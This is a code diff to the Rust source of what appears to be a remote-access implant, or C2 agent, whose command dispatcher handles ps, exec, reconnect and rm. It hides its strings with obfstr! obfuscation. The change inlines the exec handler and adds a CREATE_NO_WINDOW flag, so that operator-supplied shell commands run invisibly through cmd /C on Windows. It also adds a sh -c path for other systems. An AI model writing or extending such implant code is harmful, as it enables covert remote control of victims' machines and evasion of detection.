@@ -320,7 +320,10 @@ async fn execute_command(cmd: &str, state: &mut AgentState, endpoint: &Endpoint)
     } else if cmd_name == obfstr!("ps") {
         handle_ps(&args).await
     } else if cmd_name == obfstr!("exec") {
-        handle_exec(&args).await
+        if args.is_empty() {
+            return Err(obfstr!("invalid arguments").into());
+        }
+        exec_system_command(&args.join(" ")).await
     } else if cmd_name == obfstr!("reconnect") {
         handle_reconnect(&args, state).await
     } else if cmd_name == obfstr!("rm") {
@@ -339,9 +342,25 @@ async fn execute_command(cmd: &str, state: &mut AgentState, endpoint: &Endpoint)
 }
 
 async fn exec_system_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
-    let output = ProcessCommand::new(obfstr!("cmd")).args(&[obfstr!("/C").as_str(), cmd]).output()?;
-    Ok(String::from_utf8_lossy(&output.stdout).to_string()
-        + &String::from_utf8_lossy(&output.stderr).to_string())
+    #[cfg(target_os = "windows")]
+    {
+        use std::os::windows::process::CommandExt;
+        const CREATE_NO_WINDOW: u32 = 0x08000000;
+        
+        let output = ProcessCommand::new(obfstr!("cmd"))
+            .args(&[obfstr!("/C").as_str(), cmd])
+            .creation_flags(CREATE_NO_WINDOW)
+            .output()?;
+        Ok(String::from_utf8_lossy(&output.stdout).to_string()
+            + &String::from_utf8_lossy(&output.stderr).to_string())
+    }
+    
+    #[cfg(not(target_os = "windows"))]
+    {
+        let output = ProcessCommand::new("sh").args(&["-c", cmd]).output()?;
+        Ok(String::from_utf8_lossy(&output.stdout).to_string()
+            + &String::from_utf8_lossy(&output.stderr).to_string())
+    }
 }
 
 async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
@@ -613,13 +632,6 @@ fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
         let _ = CloseHandle(snapshot);
         Ok(result)
     }
-}
-
-async fn handle_exec(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
-    if args.is_empty() {
-        return Err(obfstr!("invalid arguments").into());
-    }
-    exec_system_command(&args.join(" ")).await
 }
 
 async fn handle_reconnect(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
